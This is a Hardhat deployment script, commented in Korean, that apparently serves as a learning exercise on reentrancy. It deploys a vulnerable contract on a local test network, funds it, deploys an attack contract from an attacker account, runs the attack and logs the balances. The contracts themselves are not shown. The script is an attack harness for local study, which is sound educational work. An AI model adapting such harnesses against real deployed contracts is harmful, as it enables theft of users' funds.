const hre = require("hardhat");

async function main() {
  //➡️ Hardhat은 getSigners()의 첫 번째 계정 (accounts[0]) 을 자동 기본값으로 사용해.
  // 즉, ethers.getContractFactory()가 리턴하는 컨트랙트 인스턴스는 기본적으로 signers[0] (즉, 첫 번째 계정)과 연결되어 있다
  const [deployer, attacker] = await hre.ethers.getSigners();

  console.log("🚀 Deployer address:", deployer.address);
  console.log("🎯 Attacker address:", attacker.address);

  // Vulnerable 컨트랙트 배포
  const Vulnerable = await hre.ethers.getContractFactory("Vulnerable");
  // 배포 트랜잭션을 생성하고, 네트워크에 전송함
  // 아직 “블록에 확정되지 않은 상태”다. 따라서, vulnerable은 배포 준비 중인 컨트랙트 인스턴스로 보면 됨
  // vulnerable은 실제 배포된 컨트랙트의 주소, 함수, 상태 등 모든 기능을 가진 JS 객체야. 이후에 vulnerable.donate(), vulnerable.withdraw() 처럼 사용할 수 있어.
  // 마치 "스마트 컨트랙트 클래스의 인스턴스"처럼 이용하면 됨
  const vulnerable = await Vulnerable.deploy();
  //그 트랜잭션이 실제로 블록에 포함될 때까지 기다림
  await vulnerable.waitForDeployment(); // ✅ 최신 Hardhat에서는 deployed 대신 이걸 사용!
  // console.log("✅ Vulnerable deployed at:", vulnerableAddress);  아래에 더 안전한 방법으로 바꿈
  const vulnerableAddress = await vulnerable.getAddress();
  console.log("✅ Vulnerable deployed at:", vulnerableAddress);

  // 초기 자금 공급
  await deployer.sendTransaction({
    to: vulnerableAddress,
    //최신 Hardhat에서는 ethers.utils.parseEther() 대신 ethers.parseEther()로 바뀌었어!
    //value: hre.ethers.utils.parseEther("5"),
    value: hre.ethers.parseEther("5"),
  });
  console.log("💰 Vulnerable funded with 5 ETH");

  // 공격 컨트랙트 배포
  const Attack = await hre.ethers.getContractFactory("AttackReentrancy");
  // Connect() 함수:  "누가 이 트랜잭션을 보내는가"를 지정하는 것
  // Hardhat의 컨트랙트 인스턴스는 기본적으로 배포자 (deployer) 계정으로 연결돼 있어.
  // 하지만 우리가 어떤 함수나 배포를 다른 계정으로 하고 싶을 때, .connect()를 써서 연결을 바꾸는 거야.
  //deploy(vulnerableAddress) => 공격 대상인 Vulnerable 컨트랙트의 주소를 생성자 넘겨줌
  const attack = await Attack.connect(attacker).deploy(vulnerableAddress);
  await attack.waitForDeployment();
  // console.log("⚔️  Attack contract deployed at:", attack.address);
  console.log(
    "⚔️  Attacker contract deployed at:",
    await attacker.getAddress()
  );

  // //공격자한테 100 ETH만 남겨놓고 공격 시뮬레이션
  // const balance = await hre.ethers.provider.getBalance(attacker.address);
  // await attacker.sendTransaction({
  //   to: "0x000000000000000000000000000000000000dead", // dummy 주소
  //   value: balance - hre.ethers.parseEther("100"), // 100 ETH만 남기고 보내버리기
  // });

  console.log(
    "🔥 공격 시작 전 Attack 컨트랙트 잔액:",
    hre.ethers.formatEther(
      await hre.ethers.provider.getBalance(attack.getAddress())
    )
  );

  console.log(
    "🔥 공격 시작 전 Attacker EOA 잔액:",
    hre.ethers.formatEther(
      await hre.ethers.provider.getBalance(attacker.getAddress())
    )
  );

  //revert가 나도 이후에 balance 조회하기 위해 공격 실행문 + 결과 확인문 tryCatch로 감싸기
  try {
    // 공격 실행
    const tx = await attack.connect(attacker).attack({
      // value: hre.ethers.utils.parseEther("1"),
      value: hre.ethers.parseEther("1"),
    });
    await tx.wait();
    // ✅ 추가: 잔액 확인
    const attackerEOABalanceAfter = await hre.ethers.provider.getBalance(
      attacker.address
    );
    const attackContractBalanceAfter = await hre.ethers.provider.getBalance(
      await attack.getAddress()
    );

    console.log(
      "📊 공격 성공 후 Attacker EOA 잔액:",
      hre.ethers.formatEther(attackerEOABalanceAfter)
    );
    console.log(
      "📊 공격 성공 후 Attack 컨트랙트 잔액:",
      hre.ethers.formatEther(attackContractBalanceAfter)
    );
  } catch (e) {
    console.log("🚨 공격 중 revert 발생!");
    // 결과 확인
    // const attackerBalance = await hre.ethers.provider.getBalance(
    //   attacker.getAddress()
    // );
    // console.log(
    //   "📊 Attack contract balance:",
    //   hre.ethers.formatEther(attackerBalance),
    //   "ETH"
    // );

    console.log(
      "📊 공격 실패 후 Attack 컨트랙트 잔액:",
      hre.ethers.formatEther(
        await hre.ethers.provider.getBalance(attack.getAddress())
      )
    );

    console.log(
      "📊 공격 실패 후 Attacker EOA 잔액:",
      hre.ethers.formatEther(
        await hre.ethers.provider.getBalance(attacker.getAddress())
      )
    );

    const finalVulnerableBalance = await hre.ethers.provider.getBalance(
      vulnerableAddress
    );
    const finalAttackBalance = await hre.ethers.provider.getBalance(
      await attack.getAddress()
    );
    const finalAttackerBalance = await hre.ethers.provider.getBalance(
      attacker.address
    );

    console.log(
      "📦 vulnerable 최종 잔액:",
      hre.ethers.formatEther(finalVulnerableBalance)
    );
    console.log(
      "🪙 attack 컨트랙트 최종 잔액:",
      hre.ethers.formatEther(finalAttackBalance)
    );
    console.log(
      "🧍‍♂️ attacker EOA 최종 잔액:",
      hre.ethers.formatEther(finalAttackerBalance)
    );
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
